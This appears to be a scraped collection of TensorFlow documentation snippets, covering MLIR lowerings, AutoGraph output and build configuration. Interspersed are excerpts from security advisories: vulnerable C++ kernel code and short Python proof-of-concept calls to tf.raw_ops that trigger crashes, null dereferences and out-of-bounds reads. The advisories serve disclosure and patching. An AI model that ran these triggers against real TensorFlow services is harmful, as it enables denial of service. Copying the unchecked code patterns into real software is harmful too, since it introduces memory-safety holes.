       %2 = "tf.OpB"(%1) {is_stateless = true}
       %results:2 = "tf.WhileRegion"(%arg0, %arg1) ({
       ^bb0(%arg2, %arg3):
         %0 = "tf.OpA"() {is_stateless = true}
         "tf.Yield"(%0)
       }, {
       ^bb0(%arg2, %arg3):
         %3 = "tf.OpC"(%arg2, %2) {is_stateless = true}
         %4 = "tf.OpD"(%arg3, %2) {is_stateless = true}
         "tf.Yield"(%3, %4)
       }) {is_stateless = true}
       return %results#0, %results#1
     }
```

----------------------------------------

TITLE: Break Statement in For Loop Transformed Output Python
DESCRIPTION: Partial output code generated by AutoGraph showing the transformation of a `break` statement in a `for` loop using a control boolean and the `ag__.for_stmt` helper.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_30

LANGUAGE: Python
CODE:
```
break_ = False
...
def extra_test(break_):
  return ag__.not_(break_)
# break_ becomes a loop variable.
break_, = ag__.for_stmt(range(10), extra_test, ..., (break_,))
```

----------------------------------------

TITLE: Vulnerable Division Calculation in Conv3DBackprop C++ Kernel
DESCRIPTION: This C++ snippet from the TensorFlow kernel code (`conv_grad_ops_3d.cc`) shows the calculation of `shard_size`. The vulnerability lies in the fact that `work_unit_size` can become zero if input tensor sizes are zero, leading to a division by zero when calculating `shard_size` without checking if `work_unit_size` is non-zero.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-011.md#_snippet_2

LANGUAGE: c++
CODE:
```
  const int64 size_A = output_image_size * dims.out_depth;
  const int64 size_B = filter_total_size * dims.out_depth;
  const int64 size_C = output_image_size * filter_total_size;
  const int64 work_unit_size = size_A + size_B + size_C;
  ...
  const size_t shard_size =
      use_parallel_contraction
        ? 1
        : (target_working_set_size + work_unit_size - 1) / work_unit_size;
```

----------------------------------------

TITLE: Lowering Round Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a round operation to the TOSA dialect. It implements the rounding logic using the identity round(x) = floor(x + 0.5). It adds a constant value of 0.5 to the input tensor and then applies the TOSA FLOOR operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_19

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_round_op(Value %x)
{
    %half = tosa.CONST() {value={0.5}}
    %add = tosa.ADD(%x, %half)
    %output = tosa.FLOOR(%add)

    return %output
}
```

----------------------------------------

TITLE: Linking Libraries for MhloDialect
DESCRIPTION: This command specifies the public libraries that the `MhloDialect` library links against, including various MLIR core and dialect libraries, and HLO-specific utility libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_7

LANGUAGE: cmake
CODE:
```
target_link_libraries(MhloDialect
  PUBLIC
  MLIRComplexDialect
  MLIRIR
  MLIRMhloUtils
  MLIRQuantDialect
  MLIRSparseTensorDialect
  HloOpsCommon
  StablehloAssemblyFormat
  StablehloBase
  StablehloTypeInference
)
```

----------------------------------------

TITLE: Flattening Tensors - MLIR
DESCRIPTION: This snippet shows how multi-dimensional tensors are flattened into 1D tensors. An xla_gpu.indexing_map is introduced to map the original N-D indices (thread, block, vector index) to a single index in the flattened 1D tensor, simplifying memory access patterns for subsequent vectorization and lowering.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_3

LANGUAGE: MLIR
CODE:
```
#map = #xla_gpu.indexing_map<"(th_x, bl_x, vector_index) -> (th_x * 4 + bl_x * 512 + vector_index),"
 "domain: th_x in [0, 127], bl_x in [0, 24575], vector_index in [0, 3]">

func.func @main(%input: tensor<12582912xbf16>, %output: tensor<12582912xbf16>) -> tensor<12582912xbf16> {
 %xla_loop = scf.for %vector_index = %c0 to %c4 step %c1 iter_args(%iter = %output) -> (tensor<12582912xbf16>) {
   %dim = xla_gpu.apply_indexing #map(%thread_id_x, %block_id_x, %vector_index)
   %extracted = tensor.extract %input[%dim] : tensor<12582912xbf16>
   %2 = arith.mulf %extracted, %extracted : bf16
   %3 = arith.mulf %2, %extracted : bf16
   %4 = arith.mulf %3, %cst_2 : bf16
   %5 = arith.addf %extracted, %4 : bf16
   %6 = arith.mulf %5, %cst_1 : bf16
   %7 = math.tanh %6 : bf16
   %8 = arith.addf %7, %cst_0 : bf16
   %9 = arith.mulf %8, %cst : bf16
   %10 = arith.mulf %extracted, %9 : bf16
   %inserted = tensor.insert %10 into %iter[%dim] : tensor<12582912xbf16>
   scf.yield %inserted : tensor<12582912xbf16>
 }
 return %xla_loop : tensor<12582912xbf16>
}
```

----------------------------------------

TITLE: Defining Eigen Quantized Types without Default Initialization (C++)
DESCRIPTION: These C++ struct definitions for quantized integer types (QUInt8, QInt16, QUInt16, QInt32) in Eigen demonstrate the vulnerability. The constructors are empty, failing to default-initialize the `value` member, which is the root cause of the uninitialized memory access issue described in TFSA-2020-029.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-029.md#_snippet_0

LANGUAGE: C++
CODE:
```
struct QUInt8 {
  QUInt8() {}
  // ...
  uint8_t value;
};

struct QInt16 {
  QInt16() {}
  // ...
  int16_t value;
};

struct QUInt16 {
  QUInt16() {}
  // ...
  uint16_t value;
};

struct QInt32 {
  QInt32() {}
  // ...
  int32_t value;
};

```

----------------------------------------

TITLE: Demonstrating Vulnerable Code Logic in SparseFillEmptyRows (C++)
DESCRIPTION: This C++ snippet shows the specific location within the SparseFillEmptyRows kernel implementation where the vulnerability occurs. It highlights the line accessing the underlying data vector of the dense_shape tensor without checking for emptiness, leading to a null pointer dereference if dense_shape_t has zero size. This is part of the TensorFlow C++ kernel implementation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-053.md#_snippet_1

LANGUAGE: c++
CODE:
```
template <typename T, typename Tindex>
struct SparseFillEmptyRows<CPUDevice, T, Tindex> {
  Status operator()(OpKernelContext* context, const Tensor& default_value_t,
                    const Tensor& indices_t, const Tensor& values_t,
                    const Tensor& dense_shape_t,
                    typename AsyncOpKernel::DoneCallback done) {
    ...
    const auto dense_shape = dense_shape_t.vec<Tindex>();
    ...
  }
}
```

----------------------------------------

TITLE: Return Statement in While Loop Transformed Output Python
DESCRIPTION: Output code generated by AutoGraph showing the transformation of a `return` statement using a control boolean (`do_return`) and a variable (`retval_`) to track the return value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_36

LANGUAGE: Python
CODE:
```
def f():
  do_return = False
  retval_ = ag__.UndefinedReturnValue()
  while i < 10 and not do_return:
    if i > 3:
      do_return = True
      retval_ = 1
    if not do_return:
      i += 1
  return ag__.retval(retval_)  # Transforms any UndefinedReturnValue to None
```

----------------------------------------

TITLE: Populating TFLite Source Files CMake
DESCRIPTION: Uses the `populate_tflite_source_vars` function to discover and collect all relevant source files for the TensorFlow Lite library from the current directory (`.`), storing the list of files in the `TFLITE_SRCS` CMake variable for subsequent compilation steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_21

LANGUAGE: CMake
CODE:
```
# Build a list of source files to compile into the TF Lite library.
populate_tflite_source_vars("." TFLITE_SRCS)
```

----------------------------------------

TITLE: Illustrating Use After Move in CollectiveReduceV2 (C++)
DESCRIPTION: This C++ snippet highlights the vulnerable pattern within the `CollectiveReduceV2` implementation. It shows a lambda `done_with_cleanup` capturing a callback `done` by `std::move`. The vulnerability occurs because the `OP_REQUIRES_OK_ASYNC` macro might attempt to access the `done` variable (which has been moved from) when handling errors, potentially resulting in a use-after-free or other undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-177.md#_snippet_1

LANGUAGE: C++
CODE:
```
auto done_with_cleanup = [col_params, done = std::move(done)]() {
  done();
  col_params->Unref();
};
OP_REQUIRES_OK_ASYNC(c,
                     FillCollectiveParams(col_params, REDUCTION_COLLECTIVE,
                                          /*group_size*/ c->input(1),
                                          /*group_key*/ c->input(2),
                                          /*instance_key*/ c->input(3)),
                     done);
```

----------------------------------------

TITLE: Defining CHLO Legalize Patterns Tablegen Source (CMake)
DESCRIPTION: Sets the CMake variable LLVM_TARGET_DEFINITIONS to point to the chlo_legalize_to_hlo_patterns.td file. This file is used by the MLIR tablegen tool to generate code related to CHLO legalization patterns.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
set(LLVM_TARGET_DEFINITIONS chlo_legalize_to_hlo/chlo_legalize_to_hlo_patterns.td)
```

----------------------------------------

TITLE: Displaying Sampled Indices Python
DESCRIPTION: This snippet simply displays the numpy array containing the sampled character indices obtained from the previous sampling step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_26

LANGUAGE: python
CODE:
```
sampled_indices
```

----------------------------------------

TITLE: Configure Benchmarker Model/Image Paths - Java Snippet
DESCRIPTION: Snippet from `OvicBenchmarkerActivity.java` showing where to modify `testImagePath` and `modelPath` to point to your specific test image and TFLite model file for benchmarking within the app.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_9

LANGUAGE: java
CODE:
```
if (benchmarkClassification) {
    ...
    testImagePath = "my_test_image.jpg";
    modelPath = "my_model.lite";
  } else {  // Benchmarking detection.
  ...
```

----------------------------------------

TITLE: Retrieving and Checking Grappler Node by Tensor ID (C++)
DESCRIPTION: This C++ snippet from TensorFlow's Grappler graph view logic retrieves a graph node using its ID extracted from a `TensorId` via `graph.GetNode`. It then immediately dereferences the returned pointer to check if the node is a 'Switch' operation using `IsSwitch`. Similar to the constant folding issue, a null pointer dereference occurs if `graph.GetNode` returns null because the specified node is missing in the graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-052.md#_snippet_1

LANGUAGE: C++
CODE:
```
  NodeDef* input_node = graph.GetNode(tensor_id.node());
  return IsSwitch(*input_node);
```

----------------------------------------

TITLE: Triggering Type Confusion with one_hot / TensorFlow / Python
DESCRIPTION: This Python snippet shows the CVE-2021-29513 vulnerability triggered using `tf.one_hot`. By setting the output `dtype` to 20 (a non-numeric type) while the operation expects numeric types, this code path leads to the type confusion and subsequent null pointer dereference during the conversion process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-003.md#_snippet_2

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
data = tf.one_hot(indices=[62,50],depth=136,on_value=np.int32(237),off_value=158,axis=856,dtype=20)
```

----------------------------------------

TITLE: Triggering MapStage CHECK-fail in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger a denial of service vulnerability (CVE-2021-37673) in `tf.raw_ops.MapStage` by calling the operation with an empty `key` tensor of specific shape and dtype. It requires the TensorFlow library and will result in a `CHECK`-fail.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-147.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.MapStage(
  key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),
  indices=tf.constant((0), dtype=tf.int32),
  values=[tf.constant((0), dtype=tf.int32)],
  dtypes=[tf.int32,
  tf.int64],
  capacity=0,
  memory_limit=0,
  container='',
  shared_name='')
```

----------------------------------------

TITLE: Helper Function to Get Variable Input Tensor in TFLite
DESCRIPTION: This C++ function, `GetVariableInput`, is a helper used in TFLite kernels. It retrieves a mutable input tensor using `GetMutableInput`. It then checks if the retrieved tensor is a variable tensor. If it is, the tensor pointer is returned; otherwise, a null pointer is returned. This function contributes to the vulnerability as its return value is not checked by callers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-155.md#_snippet_1

LANGUAGE: C++
CODE:
```
TfLiteTensor* GetVariableInput(TfLiteContext* context, const TfLiteNode* node,
                               int index) {
  TfLiteTensor* tensor = GetMutableInput(context, node, index);
  return tensor->is_variable ? tensor : nullptr;
}
```

----------------------------------------

TITLE: Accessing TensorFlow Tensor Attribute C++
DESCRIPTION: This C++ snippet shows the vulnerable code path where an attribute is found and then dereferenced. It uses a `DCHECK` for a null check, but `DCHECK` is a no-op in release builds, allowing execution to proceed with a null pointer, resulting in a dereference vulnerability when decoding tensors from protobufs with missing attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-034.md#_snippet_0

LANGUAGE: C++
CODE:
```
  const auto* attr = attrs.Find(arg->s());
  DCHECK(attr != nullptr);
  if (attr->value_case() == AttrValue::kList) {
    // ...
  }
```

----------------------------------------

TITLE: Demonstrating Heap OOB in SdcaOptimizerV2 using Python
DESCRIPTION: This Python snippet demonstrates how to trigger the heap out-of-bounds read vulnerability in `tf.raw_ops.SdcaOptimizerV2` by providing specially crafted arguments, such as an empty `example_labels` list, which the vulnerable implementation does not validate. This code requires a TensorFlow version affected by CVE-2021-37672 before the patch.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-146.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.SdcaOptimizerV2(
  sparse_example_indices=[[1]],
  sparse_feature_indices=[[1]],
  sparse_feature_values=[[1.0,2.0]],
  dense_features=[[1.0]],
  example_weights=[1.0],
  example_labels=[],
  sparse_indices=[1],
  sparse_weights=[1.0],
  dense_weights=[[1.0]],
  example_state_data=[[100.0,100.0,100.0,100.0]],
  loss_type='logistic_loss',
  l1=100.0,
  l2=100.0,
  num_loss_partitions=1,
  num_inner_iterations=1,
  adaptive=True)
```

----------------------------------------

TITLE: Lowering Gather Nd Op to TOSA (MLIR)
DESCRIPTION: This function lowers a gather_nd operation, which uses the last dimension of the 'indices' tensor to specify the indices into the first 'ND' dimensions of the 'params' tensor. It calculates dimensions, computes flatten coefficients, reshapes parameters and indices, performs multiplication and reduction on indices to create a flat index list, uses TOSA GATHER with the flattened indices, and finally reshapes the result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_33

LANGUAGE: MLIR
CODE:
```
Value lower_gather_nd_op(Value %params, Value %indices)
{
    int32 N = W = K = C = ND = 1;

    ND = %indices.shape[%indices.rank - 1];

    assert ND < %params.rank;

    for (int32 i = 0; i < (%indices.rank - 1); i++) W *= %indices.shape[i];
    for (int32 i = 0; i < ND; i++) K = %params.shape[i];
    for (int32 i = ND; i < %params.rank; i++) C *= %params.shape[i];

    vector<int32> flatten_coeff_vec;
    for (int32 i = 0; i < ND; i++) flatten_coeff_vec.push_back(i);
    flatten_coeff_vec.push_back(1);

    %const_flatten_coeff = tosa.CONST() {value=flatten_coeff_vec};
    %op1_reshape_params = tosa.RESHAPE(%params) {shape={N,K,C}};
    %op2_reshape_indices = tosa.RESHAPE(%indices) {shape={W,ND}};
    %op3_mul_op2_flatten_coeff = tosa.MUL(%op2_reshape_indices, %const_flatten_coeff);
    %op4_rsum_op3 = tosa.REDUCE_SUM(%op3_mul_op2_flatten_coeff) {axis=1};
    %op5_reshape_op4 = tosa.RESHAPE(%op4_rsum_op3) {shape={N,W}};
    %op6_gather_op1_op5 = tosa.GATHER(%op1_reshape_params, %op5_reshape_op4);
    %op7_reshape_op6 = tosa.RESHAPE(%op6_gather_op1_op5) {shape={N,W,C}};
}
```

----------------------------------------

TITLE: Formatting References in Docstring - None
DESCRIPTION: Illustrates the required format for the `#### References` subsection within docstrings, following ICLR bibliography style. Includes examples for different publication types (technical report, journal, arXiv, conference) and specifies formatting for multiple authors and links.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/STYLE_GUIDE.md#_snippet_1

LANGUAGE: none
CODE:
```
#### References

# technical report
[1]: Tony Finch. Incremental calculation of weighted mean and variance.
     _Technical Report_, 2009.
     http://people.ds.cam.ac.uk/fanf2/hermes/doc/antiforgery/stats.pdf

# journal
[2]: Andrew Gelman and Donald B. Rubin. Inference from Iterative Simulation
     Using Multiple Sequences. _Statistical Science_, 7(4):457-472, 1992.

# arXiv preprint
# use "et al." for papers with too many authors to maintain
[3]: Aaron van den Oord et al. Parallel WaveNet: Fast High-Fidelity Speech
     Synthesis. _arXiv preprint arXiv:1711.10433_, 2017.
     https://arxiv.org/abs/1711.10433

# conference
[4]: Yeming Wen, Paul Vicol, Jimmy Ba, Dustin Tran, and Roger Grosse.
         Flipout: Efficient Pseudo-Independent Weight Perturbations on
         Mini-Batches. In _International Conference on Learning
         Representations_, 2018.
         https://arxiv.org/abs/1803.04386
```

----------------------------------------

TITLE: Triggering MaxPoolGradWithArgmax Heap Read Vulnerability - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to craft inputs (`input`, `grad`, `argmax`) for the `tf.raw_ops.MaxPoolGradWithArgmax` operation to potentially trigger a heap out of bounds read vulnerability (CVE-2021-29570). The vulnerability arises because the inputs are crafted such that indexing logic in the C++ kernel uses the same value for arrays of different sizes. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-057.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)
grad = tf.constant([10.0, 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)
argmax = tf.constant([1], shape=[1], dtype=tf.int64)
ksize = [1, 1, 1, 1]
strides = [1, 1, 1, 1]

tf.raw_ops.MaxPoolGradWithArgmax(
    input=input,
    grad=grad,
    argmax=argmax,
    ksize=ksize,
    strides=strides,
    padding='SAME',
    include_batch_in_index=False)
```

----------------------------------------

TITLE: Demonstrating FusedBatchNorm Heap Buffer Overflow in TensorFlow (Python)
DESCRIPTION: This Python snippet demonstrates a heap buffer overflow vulnerability in `tf.raw_ops.FusedBatchNorm`. It provides scale, offset, mean, and variance tensors with a size of 1, while the input `x` has 6 channels, leading to out-of-bounds reads.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-072.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

x = tf.zeros([10, 10, 10, 6], dtype=tf.float32)
scale = tf.constant([0.0], shape=[1], dtype=tf.float32)
offset = tf.constant([0.0], shape=[1], dtype=tf.float32)
mean = tf.constant([0.0], shape=[1], dtype=tf.float32)
variance = tf.constant([0.0], shape=[1], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = "NHWC"
is_training = False

tf.raw_ops.FusedBatchNorm(
  x=x, scale=scale, offset=offset, mean=mean, variance=variance,
  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,
  data_format=data_format, is_training=is_training)
```

----------------------------------------

TITLE: Calculating dimensions in TFLite GatherNd (C++)
DESCRIPTION: This C++ code snippet is part of the TFLite `GatherNd` reference implementation. It calculates a dimension size for the output tensor by dividing `remain_flat_size` by the size of the current dimension (`params_shape.Dims(i)`). The vulnerability arises here because `params_shape.Dims(i)` can be zero if the input tensor `params` has a dimension of size zero, leading to a division by zero error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-076.md#_snippet_0

LANGUAGE: C++
CODE:
```
ret.dims_to_count[i] = remain_flat_size / params_shape.Dims(i);
```

----------------------------------------

TITLE: Vulnerable Loop Code in TensorFlow MaxPoolGrad Implementation (C++)
DESCRIPTION: This C++ snippet is extracted from the TensorFlow `MaxPoolGrad` kernel implementation and shows the loop containing the heap buffer overflow vulnerability. While `input_backprop_flat` access is guarded by `FastBoundsCheck`, the access to `out_backprop_flat(index)` within the loop is not adequately checked, leading to potential out-of-bounds reads when the index is invalid.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-068.md#_snippet_1

LANGUAGE: cpp
CODE:
```
for (int index = out_start; index < out_end; ++index) {
  int input_backprop_index = out_arg_max_flat(index);
  FastBoundsCheck(input_backprop_index - in_start, in_end - in_start);
  input_backprop_flat(input_backprop_index) += out_backprop_flat(index);
}
```

----------------------------------------

TITLE: Declare MLIR HLO Python Extension Module
DESCRIPTION: This command declares a specific Python extension module named `_mlirHlo`. It adds the C++ source file `MlirHloModule.cc` to the extension group and links against required libraries like `MLIRHLOCAPIDialects` and `LLVMSupport`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/python/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
declare_mlir_python_extension(MLIRHLOPythonExtensions.Main
  MODULE_NAME _mlirHlo
  ADD_TO_PARENT MLIRHLOPythonExtensions
  SOURCES
    MlirHloModule.cc
  EMBED_CAPI_LINK_LIBS
    MLIRHLOCAPIDialects
  PRIVATE_LINK_LIBS
    LLVMSupport
)
```

----------------------------------------

TITLE: Configuring Deprecated Non-Hermetic CUDA/NCCL (Bazel)
DESCRIPTION: This Bazel WORKSPACE snippet shows the deprecated method for configuring Bazel to use a locally installed CUDA/CUDNN/NCCL. It involves loading and calling the `cuda_configure` and `nccl_configure` rules, typically placed at the bottom of the file after removing hermetic setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_15

LANGUAGE: Bazel
CODE:
```
load("@local_xla//third_party/gpus:cuda_configure.bzl", "cuda_configure")
cuda_configure(name = "local_config_cuda")
load("@local_xla//third_party/nccl:nccl_configure.bzl", "nccl_configure")
nccl_configure(name = "local_config_nccl")
```

----------------------------------------

TITLE: Define IDENTITY Constant in ScoreTransformationType (Python)
DESCRIPTION: Defines the integer value associated with the IDENTITY score transformation type. This constant is a member of the `tflite_support.metadata_schema_py_generated.ScoreTransformationType` class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreTransformationType.md#_snippet_0

LANGUAGE: Python
CODE:
```
0
```

----------------------------------------

TITLE: Set Minimum CMake Version
DESCRIPTION: Specifies the minimum required version of CMake for building the project. This ensures that all necessary CMake commands and policies are available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
cmake_minimum_required(VERSION 3.15.0)
```

----------------------------------------

TITLE: Pinning Keras and TensorBoard Nightly Dependencies
DESCRIPTION: These lines specify dependencies on nightly builds of Keras and TensorBoard, pinned to versions compatible with the target TensorFlow major/minor version. These are used specifically in nightly build jobs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_common.txt#_snippet_3

LANGUAGE: Python
CODE:
```
keras-nightly ~= 2.14.0.dev
```

LANGUAGE: Python
CODE:
```
tb-nightly ~= 2.14.0.a
```

----------------------------------------

TITLE: Listing Runtime Client APIs (C++)
DESCRIPTION: This snippet lists C++ symbols for the runtime client functionality, exposed by the `//tensorflow/core/function:runtime_client_cc` build target. It includes references to global eager contexts and runtime methods for function creation and retrieval.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_4

LANGUAGE: C++
CODE:
```
tensorflow::core::function::GlobalEagerContext
```

LANGUAGE: C++
CODE:
```
tensorflow::core::function::GlobalPythonEagerContext
```

LANGUAGE: C++
CODE:
```
tensorflow::core::function::Runtime::CreateFunction
```

LANGUAGE: C++
CODE:
```
tensorflow::core::function::Runtime::GetFunctionProto
```

----------------------------------------

TITLE: Deprecated Get Root SubGraphMetadata in Python
DESCRIPTION: Deprecated class method to get the root `SubGraphMetadata` object from a FlatBuffer buffer. It is recommended to use the generic `GetRootAs` method instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_8

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsSubGraphMetadata(
    buf, offset=0
)
```

----------------------------------------

TITLE: Demonstrating Heap OOB in ResourceScatterUpdate (Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger a heap out-of-bounds read vulnerability in `tf.raw_ops.ResourceScatterUpdate`. It initializes a variable and then calls the operation with specifically crafted `indices` and `updates` arguments that exploit the incomplete shape validation, leading to the security issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-129.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

v = tf.Variable([b'vvv'])
tf.raw_ops.ResourceScatterUpdate(
  resource=v.handle,
  indices=[0],
  updates=['1', '2', '3', '4', '5'])
```

----------------------------------------

TITLE: Triggering OOB Read in TensorFlow CTCLoss (Python)
DESCRIPTION: This Python snippet demonstrates how specially crafted empty tensor inputs and negative sequence lengths can be used to trigger an out-of-bounds read vulnerability within the `tf.raw_ops.CTCLoss` operation due to insufficient input validation. It initializes tensors with zero dimensions and negative values to exploit the flaw.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-101.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

inputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)
labels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)
labels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)
sequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)

tf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,
                   labels_values=labels_values, sequence_length=sequence_length,
                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,
                   ignore_longer_outputs_than_inputs=True)
```

----------------------------------------

TITLE: Vulnerable TFLite MLIR Optimization Function C++
DESCRIPTION: This C++ snippet shows the `L2NormalizeReduceAxis` function within TensorFlow Lite's MLIR optimizations that contained a null pointer dereference vulnerability. It dereferences the beginning iterator of `axis.getValues<int>()` without checking if the collection is empty, leading to a crash if `axis` has no elements.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-163.md#_snippet_0

LANGUAGE: C++
CODE:
```
bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast<ShapedType>().getRank() - 1 ==
          *axis.getValues<int>().begin() ||
      *axis.getValues<int>().begin() == -1) {
      // ...
  }
  // ...
}
```

----------------------------------------

TITLE: Triggering SdcaOptimizer Null Pointer Vulnerability in TensorFlow Python
DESCRIPTION: This Python code snippet serves as a proof-of-concept to demonstrate the null pointer dereference vulnerability (TFSA-2021-060) in `tf.raw_ops.SdcaOptimizer`. It calls the operation with specific, potentially invalid inputs that trigger the bug before the patch was applied, causing undefined behavior or a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-060.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

sparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]
sparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]
sparse_feature_values = []

dense_features = []
dense_weights = []

example_weights = tf.constant((0.0), dtype=tf.float32)
example_labels = tf.constant((0.0), dtype=tf.float32)

sparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]
sparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]

example_state_data = tf.constant([0.0, 0.0, 0.0, 0.0], shape=[1, 4], dtype=tf.float32)

tf.raw_ops.SdcaOptimizer(
  sparse_example_indices=sparse_example_indices,
  sparse_feature_indices=sparse_feature_indices,
  sparse_feature_values=sparse_feature_values, dense_features=dense_features,
  example_weights=example_weights, example_labels=example_labels,
  sparse_indices=sparse_indices, sparse_weights=sparse_weights,
  dense_weights=dense_weights, example_state_data=example_state_data,
  loss_type="logistic_loss", l1=0.0, l2=0.0, num_loss_partitions=1,
  num_inner_iterations=1, adaptative=False)
```

----------------------------------------

TITLE: Build and Upload Placeholder Python Package Shell Commands
DESCRIPTION: This sequence of shell commands outlines the process for building a source distribution (`sdist`) of a Python package using `setup.py` and uploading it to a PyPI repository (specifically `testpypi` in this example) using `twine`. It involves editing configuration, installing build/upload tools, building the package, uploading, and finally demonstrating how to install it from the specified repository.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/redundant_tf_nightly_gpu/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
$ vim setup.cfg  # update the version number and package name
$ python3 -m pip install --user twine
$ python3 setup.py sdist
$ twine upload --repository testpypi dist/*
$ pip3 install the_name_of_your_test_package -i https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple
```

----------------------------------------

TITLE: Lowering tf.ZerosLike to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.ZerosLike` operation, which creates a tensor of zeros with the same shape and type as an input, to the TOSA dialect's `tosa.CONST` operation with a value of zero repeated for all elements.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_48

LANGUAGE: MLIR
CODE:
```
%output = tf.ZerosLike(%x)
```

LANGUAGE: MLIR
CODE:
```
%output = tosa.CONST() {value={0} * %x.num_elements}
```

----------------------------------------

